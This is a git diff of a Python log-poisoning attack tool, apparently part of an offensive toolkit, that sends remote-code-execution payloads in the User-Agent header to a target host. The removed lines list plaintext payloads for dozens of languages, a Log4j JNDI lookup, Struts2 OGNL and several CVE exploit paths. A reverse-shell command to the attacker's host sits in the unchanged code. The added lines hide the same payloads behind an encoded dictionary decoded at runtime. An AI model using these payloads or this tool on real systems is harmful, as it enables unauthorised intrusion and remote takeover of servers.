@@ -6,6 +6,7 @@ import signal
 import argparse
 import sys
 import subprocess
+import lazyencoder_decoder as ed
 BANNER = """
     __    ___              ____                            
    / /   /   |____  __  __/ __ \_      ______              
@@ -30,6 +31,14 @@ BANNER = """
 """
 print(BANNER)    
 
+shift_value = 3
+substitution_key = "clave"
+
+def ensure_http_prefix(url):
+    if not url.startswith(('http://', 'https://')):
+        return 'http://' + url
+    return url
+
 def signal_handler(sig: int, frame: any) -> None:
     print(f'\n[*] Interrupción recibida, saliendo del programa.')
     sys.exit(0)
@@ -40,84 +49,26 @@ def main():
     parser = argparse.ArgumentParser(description='LazyOwnLogPoisoning')
     parser.add_argument('--rhost', required=True, help='Host of the server')
     parser.add_argument('--lhost', required=True, help='host of the reverse shell')
-    
+
     args = parser.parse_args()
 
     rhost = args.rhost
     lhost = args.lhost    
     # URL de la aplicación vulnerable
-    url = rhost
+    url = ensure_http_prefix(rhost)
 
     # Payload inyectado en el User-Agent
     cmd = f"bash -i >& /dev/tcp/{lhost}/31337 0>&1"  # Replace with your actual command
+    payloads2 = {'PHP system': 'UR9uhMOja3qngECyYFPmW0YSDdrmzDVbAQr7WG8-', 'PHP exec': 'UR9uhMOjXEmzBwnpL0bMATvlF21nH10dRwH_Dj==', 'PHP shell_exec': 'UR9uhMOja2mzeEekNAfsDmjiE0rITMxbB21pX10wTmD_Wl==', 'PHP passtrhu': 'UR9uhMOjaNKnf3YtqqSvOT9FYAFeH2ShCAkiYWqnUn4=', 'PHP eval': 'UR9uhMOjXEEveAnpL0bMATvlF21nH10dRwH_Dj==', 'PHP assert': 'UR9uhMOjWESnCVQ0YFPmW0YSDdrmzDVbAQr7WG8-', 'Java': 'ZbYskLzwXZ5bCVYXrZ50fK1jRHyxXEmzBwoYsAL0EK0sG2J0XD52NAkopZOuPGn=', 'ShellShock': 'PQneldO6M307LA9noZ4cDaIxhHOwyZF-MgHaNJT2Q3UhjH8aKqhiPA4bZmCcRnHxTeqjKK4aPQj=', 'Python': 'fK1ui3X0GN9nRwIaqb5gjLQ0GB0rz3RiC2C0NZ52PQghiBEqIZp=', 'Node.js': 'haYvkBzbXZlbB2oupJPmhVMtF2JcafhdOkC4NZKvhaYvkBzbXZlbgVQxXbibhUIwj2IratAlgUsdNVeufVU0jHqsJtSmCUM0NYLshbCjjnvpbD5xgEsaplYvhaYvSHPbXERdLFzlqpTgQbgwhCFoQNAvCAndAGYzNVveQ0ByzuWzelXyJKjdEGf6PHr0XEm0O3IxMZjbOmE9RYgjatAnOkCzNFeuXUYqiL8jT29meEXsYWqnkGnsiLzcbNAiNBTbAGYwQa9sRHrvyES0CU5uppauQQEkkB5mbNqjegHtYVZ7NUQtisByzNZieE9sYFbAELM2GCWjauAiekszNbZoiQEmkMFzMp8jPRP3ZmYbRQ4vVoAzKKFjMwr7WK0wQa9sRHrbXEK1CVU0XbunEbYsF3Fsz24uNFQqqVunhaYxRXP7GOOzfVCuqpSvO3I1GCX5a3WmdU5sXbibhUIwj2IratAlgUsdNVeuiLMqQdyxaNKmf2BtqpTeQbYwiHyxaEAzflruZpLaEQE9RX5mzDVdNRz=', 'Ruby': 'DSYMCqgqW21yM11l', 'Perl': 'h3oxkLJwIJWTWjGopZOw', 'ASP.NET': 'Z3oxkLJwJrWdBUkzp3L0fKQxSqPbz2Szf3TzI3PohbTmYB52yEOjek1qpqObW2Y0YB52yEOjek1qpqPDDLMnFBXvXZlbB21pXbiw', 'Go': 'g3PtGCvoWf5Re21yMZ5rPU9xSprobNAiggnsM21rOmnnSqX1zpld', 'Rust': 'h3UiVodzat9xCVUeCmnKg21rFB5nMquiCVjtNZ52Txs2FCWrH2ShCAjuZqTbi3MfjHusIZ5jgVYbrAOvPG5jlMPoW3VcM2GmoZvsEQE0idPocNAxgVYqWKZfg2Qjj3AqIAx=', 'Lua': 'g3PsGCvoW3A0CQoaqb5uELUjisMrH2ShCAjuYT==', 'Bash': 'DaIxhHOwyZF-MgHaNJT2Q3UhjH8aKqhiPA4bZmCcRnHxTeqjKK4aPO==', 'PowerShell': 'Z3UfjsEwSOOjB2CeqbYrEK52VrBwXH==', 'Elixir': 'Z3oxkLJwJtShCAnnMpDgfQLqPKglJDRwOAIYsAL0EK0sG2J0V2AiggnnM21rNwobRV==', 'Kotlin': 'ZbYskLzwXZ5bCVYXrZ50fK1jRHyxXEmzBwoYsAL0EK0sG2J0XD52NAkopZOuPGn=', 'Scala': 'h3oxSsPbz2Szf3TzIKHcD2YxjdvWcES0CU0zN2T0EK52RHrmzDVbNQrzWT==', 'Swift': 'gUY0PMFka2xuSQIVqp9qELQxRHy7GOWvf2zzpJD1gaQmBLT0yJF9LAPaMpjbQ2Mfj2ulMfG0BVUwZpDfE3YrGB50afF9LDznZZKpQQEOjr9mXESnVU5rpb5dha9hGCBcQD5aew5qpqXwha9siBJxbMxwB21pWo0oCHvekLTcyf5gBVCzM2evPE==', 'TypeScript': 'haYvkBzbXZlbB2oupJPmhVMtF2JcafhdOkC4NZKvhVMtF2Jcaf5zelFzM21rPE==', 'ColdFusion': 'N0QwGBT0XB9wdkCorFepfaI2FXWvGJOeBVGmZpvogafsBsJxbNqhCQPuZpbsiTM1isFszDZcNQ5qsJTqPVCfjrzkWtczfw5opZOwNk==', 'Haskell': 'Z3oxkLJwJsGme2Uqq3Kbh3oxkLJwGJmbCVYKpqWnNaQrGHWs', 'R': 'h3oxkLJwIMS5fw5sNAPsgbBmQ2BwXJhdNO==', 'Groovy': 'NbQmPHFlWEScLA1uWG4tNQ9iGCMybNSkOxLdBb4dQxDsTX8cKARnQwHbDlWeNu==', 'Erlang': 'g3P6F21nIN9nRkkqrJTbiwjgF21nGppdOe==', 'Julia': 'hbYsRLOnPB5KZwQopZOpCKDn', 'Clojure': 'PUQqi2d1atZidkM2MV5gfUYqiH9cyJFcX3serJTaQ2gjkLJxbpFwB21pWliw', 'Dart': 'ZVMtF2Jcaf5mgU5YsZ5qPTEqFCFpz3OhOkCzrpjfg25rGB50UfixeUXsLVunB10nSsB0XN91gY==', 'Scala (Play)': 'ZbYskLzwXZ5bCVYXrZ50fK1jRHyxXEmzBwoYsAL0EK0sG2J0XD52NAkopZOuPGn=', 'Nim': 'g3Qujr9mJtA4CUUIpZOvE2Y0YB52IJOxeUXnYVi=', 'Crystal': 'ZVMtF2Jcaf5mgU4tMpDgfQDrhXO-HpFjCEC2Z3PqhQ8vToqxKJ4kOhLaAcCgRnfeTI4pKZp=', 'V': 'g3PsGCvoWfmxeUXu', 'F#': 'Z3oxkLJwJrWdBUkzp3L0fKQxSqPbz2Szf3TzI3PohbTmB3zcbNAhOiCzrpjfg25rGB50JrizgCCzrpjfg25rGB50TtKmdUMnpJSvNaQrGHWsIX==', 'Elixir (Phoenix)': 'Z3oxkLJwJtShCAnnMpDgfQLqPKglJDRwOAIYsAL0EK0sG2J0V2AiggnnM21rNwobRV==', 'Powershell (Windows)': 'Z3UfjsEwSOOjB2CeqbYrEK52VrBwXH==', 'MATLAB': 'h3oxkLJwINizgECzrleuD21iQdys', 'Objective-C': 'h3oxkLJwINizgECzrlepD21iPnys', 'Fortran': 'D2IqiHPocNAxgVYqL2LcgK1firFizNqiCQosNAPsgbBmQ2BwXJhdNO==', 'OCaml': 'AK5nlH5ccES0CU0lYIL5hm5lGCFozuDuLkUyNFGw', 'Scheme': 'PVQ5j3FozZFcC2C0NZ52NQMhiBElIZp=', 'Smalltalk': 'Y1QOjr9mXESnLEUapZ1ogaT6PHvWcES0CU0lN2T0WK52VnOqW21yMwr=', 'COBOL': 'D2IqiHOqa3qngECyXbZ1h2osGdPlcZG2BUe1NVZoEUUwGCBcGN9aLEUyND==', 'Struts2_RCE1': 'OLvmP189H211eFYuqJDfiQ9ki3XwJDWvgELsYV4vN1wjiBTszJGkfk90NZL0EKUbRHrmz20ie3IqpqL5gLEmi255Jum3e3QwAl5rfLQuFCFmyNAmOio0rKZAELM2iLJ0StAnfE9zq2SuPG5lGCFAatq0CVPtYVuqg3Y0SsPbyD50NAknMALvNQ1nPI4pGJ9yCVFarJLdQnHwUd4zJqFiPQ8eAWKgSmDuWnMaHfpgL291rF5tgVYxhHusJJSjgVXzM2vch2XmRXz9', 'Tcl': 'ELkjFdOnXD52NEUyNFi=', 'JSF_ELInjection': 'N3wwGCT1XES0OlUqrHD0iVMnFsJ0XZlbCVoqMbazNTTmhrT2WZ5gBU5sZoH1gbUniBIsJtizgDQ1pqPwgKXmRX5ocNAxNAknMALvNQ1nPI4pGJ9yCVFarJLdQnHwUd4zJqFiPQ8eAWKgSmDuWnMaHfpdiO==', 'JSP_ELInjection': 'OVw7irJ3GNuvgkLzpJDbEm5Ojr9mXESnTlCupJPshwjlFrTcyJFhdQH-XlYcEUY2S3FmaJ8lPhjzAF4dQxHtTeScKghuPB4rAVabh3EqhCErHfFbNQrzq3PohbTmRC19', 'Log4j_JNDI': 'OVwoirFsMtcyBVH6Zb8eRxfsTH4zJqJjeUMxr2DfEL0=', 'GroovyScriptEngine': 'OVw7G3Xyz3E5OlC0oZubWLCfiH5wXZlbBkMeoFYafGD-QnOyXNA2O3YoqF8eRxfsTH4zJqJjPxLeAcanRR4kTXqsdE0=', 'Scripting_Language_Perl': 'hUYwiHOwXZFbCVoqMbYpDaIxhHOwyZF-MgHaNJT2Q3UhjH8aKqhiPA4bZmCcRnHxTeqjKK4aPQPs', 'Scripting_Language_Python': 'hVo0hL9xGJ1xLAkupAZchbTei3A7GN9nOlU5q3PsgGjgFrTcyJFhdQH-XlYcEUY2S3FmaJ8lPhjzAF4dQxHtTeScKghuPB4rAVGwOk==', 'Scripting_Language_Ruby': 'hbYglXOwXZFbCVoqMbYpDaIxhHOwyZF-MgHaNJT2Q3UhjH8aKqhiPA4bZmCcRnHxTeqjKK4aPQPs', 'CVE-2019-19781': 'Q3Cuin8xJp92fE5eZ3ZchbUfiH9cW3OdfFYeZ25si2MrSsPv', 'CVE-2020-5902': 'Q3UrkByyzN9bdU4zoqLdQm4sVd90zEAdO2eaM2DzgULtk29by3SkBUUqZ2XwgUYQGBTnJtunfY==', 'CVE-2020-3452': 'QmwBB0BSTJxjgFQmpqLzDLUni24wbNKweEB=', 'CVE-2018-13382': 'Q3Cuin8xJp9yBU5mZZ5oQm4sS2FkztJjdFYypGToD2PtG3JkW2Khe2eqZ3LqhaoukMAya2Anf2sapnvcE291kF==', 'CVE-2017-5638': 'OVw7RHBizDAhBkCdEZLqELQxWZPyX25gOi9sppvKg250GCv0OLWTUiMAHIPmYIYLXpJVV0KRT0CYIbibPQQhiBE9H2Ovf2nlZZinUwBeS2Fobp90B3HaAWG3QxDsTH4aJgRlPxT3WGY-OxHlRX4rG2qng2szDVfHfaI2FX5vWD5bOjU5q3PsgIElGCFTat9kCVQ0sVeug3PsirTwXZhdOlYaHJ93ELMBFCBoIJpiB29zrJDwgbPmQ3rszphdNQrzYFLqgKUxWXumyES3dU4_sbbqgKTsGCvoHfbbO2TsZFLqgKU9VsgqJ2Odeg9nMALvOmzlSBAqJJSxeUY9YVibPQQuWB5obfGeBVGmZpvogafsBMXyW2Anf0Q1oZvrELLmP2BwXORdNQ4tW3YbhaYihCXoW3WTflQaqoL0haYfiXv0auAzNQrzYFLdha9hGCBcNZSkOlU0MAH0PQnnSnvDz3ObOkMbMZLvEG5hi21wz25nOksaZnjWALUniMBDbN9HgFQuppavN3Ewi2Boa3RiC2C0GZ5diLURkMXoWD0cNQrutA0=', 'CVE-2021-22986': 'Q21liCEybN0jgVYupF9pDLQmPH1sGK4aLA9pNAWciUQuSeSbLf4kOhHzAV8gRHPxUdOzNpDl'}
 
-    payloads = {
-        'PHP system': f"<?php system($_GET['cmd']); ?>",
-		'PHP exec':f"<?php exec($_GET['cmd']); ?>",
-		'PHP shell_exec':f"<?php shell_exec($_GET['cmd']); ?>",
-		'PHP passtrhu':f"<?php passthru($_GET['cmd']); ?>",
-		'PHP eval':f"<?php eval($_GET['cmd']); ?>",
-		'PHP assert':f"<?php assert($_GET['cmd']); ?>",
-		'Java':"${T(java.lang.Runtime).getRuntime().exec('{cmd}')}".replace('{cmd}',cmd),
-        'ShellShock':"() { :;}; /bin/bash -i >& /dev/tcp/127.0.0.1/31337 0>&1'",
-        'Python': f"import os; os.system(os.getenv('cmd'))",
-        'Node.js': f"require('child_process').exec(require('url').parse(require('http').createServer(function (req, res) {{ res.writeHead(200, {{ 'Content-Type': 'text/plain' }}); res.end('Hello World'); }}).listen(3000).on('listening', function () {{ console.log('Server running at http://127.0.0.1:3000/'); }}).on('request', function (req, res) {{ require('querystring').parse(require('url').parse(req.url).query).cmd }}).cmd));",
-        'Ruby': f"`ENV['cmd']`",
-        'Java': f"Runtime.getRuntime().exec(System.getenv('cmd'))",
-        'Perl': f"system($ENV{'cmd'})",
-        'ASP.NET': f"System.Diagnostics.Process.Start(Environment.GetEnvironmentVariable('cmd'))",
-        'Go': f"os/exec.Command(os.Getenv('cmd')).Run()",
-        'Rust': f"std::process::Command::new(env::var('cmd').unwrap()).output().expect('failed to execute process');",
-        'Lua': f"os.execute(os.getenv('cmd'))",
-        'Bash': f"{cmd}",
-        'PowerShell': f"Start-Process $env:cmd",
-        'Elixir': f"System.cmd(\"bash\", [\"-c\", System.get_env(\"cmd\")])",
-        'Kotlin': f"Runtime.getRuntime().exec(System.getenv('cmd'))",
-        'Scala': f"sys.process.Process(System.getenv('cmd')).!",
-        'Swift': f"let task = Process(); task.launchPath = \"/bin/bash\"; task.arguments = [\"-c\", ProcessInfo.processInfo.environment[\"cmd\"]!]; task.launch()",
-        'TypeScript': f"require('child_process').exec(process.env.cmd)",
-        'ColdFusion': f"#CreateObject(\"java\", \"java.lang.Runtime\").getRuntime().exec(variables.cmd)#",
-        'Haskell': f"System.Process.system (getEnv \"cmd\")",
-        'R': f"system(Sys.getenv('cmd'))",
-        'Groovy': f"\"sh ${cmd}\"",
-        'Erlang': f"os:cmd(os:getenv(\"cmd\")).",
-        'Julia': f"run(`$ENV[\"cmd\"]`)",
-        'Clojure': f"(clojure.java.shell/sh (System/getenv \"cmd\"))",
-        'Dart': f"Process.runSync(Platform.environment['cmd'], []).stdout",
-        'Scala (Play)': f"Runtime.getRuntime().exec(System.getenv('cmd'))",
-        'Nim': f"osproc.execCmd(getEnv(\"cmd\"))",
-        'Crystal': f"Process.run({cmd})",
-        'V': f"os.exec(cmd)",
-        'F#': f"System.Diagnostics.Process.Start(System.Environment.GetEnvironmentVariable(\"cmd\"))",
-        'Elixir (Phoenix)': f"System.cmd(\"bash\", [\"-c\", System.get_env(\"cmd\")])",
-        'Powershell (Windows)': f"Start-Process $env:cmd",
-        'MATLAB': f"system(getenv('cmd'))",
-        'Objective-C': f"system(getenv(\"cmd\"))",
-        'Fortran': f"call execute_command_line(getenv('cmd'))",
-        'OCaml': f"Unix.system (Sys.getenv \"cmd\")",
-        'Scheme': f"(system (getenv \"cmd\"))",
-        'Smalltalk': f"OSProcess command: (System getEnv: 'cmd')",
-        'COBOL': f"call 'system' using by value address of cmd",
-        'Struts2_RCE1': "%{{(#_='multipart/form-data').(#[email protected]('com.opensymphony.xwork2.dispatcher.HttpServletResponse').getWriter(),#out.print('{}'),#out.flush(),#out.close())}}".format(cmd),
-        'Tcl': f"exec $env(cmd)",
-        'JSF_ELInjection': "#{request.setAttribute('exec', T(java.lang.Runtime).getRuntime().exec('{cmd}'))}".replace('{cmd}',cmd),
-        'JSP_ELInjection': "${{new java.lang.ProcessBuilder('{cmd}'.split(' ')).start()}}".replace('{cmd}',cmd),
-        'Log4j_JNDI': "${{jndi:ldap://{}/malware}}".format(lhost),
-        'GroovyScriptEngine': "${{groovy.util.Eval.me('{cmd}')}}".replace('{cmd}',cmd),
-        'Scripting_Language_Perl': f"perl -e 'exec \"{cmd}\"'",
-        'Scripting_Language_Python': f"python -c 'import os; os.system(\"{cmd}\")'",
-        'Scripting_Language_Ruby': f"ruby -e 'exec \"{cmd}\"'",
-        'CVE-2019-19781': f"/vpn/../vpns/portal/scripts/newbm.pl",
-        'CVE-2020-5902': f"/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp",
-        'CVE-2020-3452': f"/+CSCOT+/translation-table",
-        'CVE-2018-13382': f"/vpn/../dana-na/../dana/html5acc/guacamole/scripts/sessionLogout",
-        'CVE-2017-5638': "${{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#cmd='{cmd}').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}}".replace('{cmd}',cmd),
-        'CVE-2021-22986': f"/mgmt/tm/util/{cmd}"
-    }
+    # Desofuscar el diccionario de cadenas
+    decoded_dict = {key: ed.decode(value, shift_value, substitution_key) for key, value in payloads2.items()}
+    # print(f"Decoded dict: {decoded_dict}")
 
-    # Formatear cada payload con el comando
-    formatted_payloads = {lang: payload.replace('cmd', cmd) for lang, payload in payloads.items()}
+    formatted_payloads = {}
 
+    for lang, payload in decoded_dict.items():
+        formatted_payloads[lang] = payload.replace('cmd', cmd)
     # Enviar la solicitud para cada payload
     for lang, payload in formatted_payloads.items():
         headers = {
@@ -127,8 +78,9 @@ def main():
             response = requests.get(url, headers=headers)
             print(f"[*] Payload inyectado en {lang}. Respuesta del servidor: {response.status_code}")
 
-        except:
-            print(f"[-] Error request: {url} payload: {payload}")
+        except Exception as e:
+            print(f"{e}")
+            print(f"[-] Error request: {url} payload: {payload} e: {e}")
     # SSH Log Poisoning mediante ssh y curl
     # Define el comando curl con la autenticación y la URL
     url = url.replace('http://','')
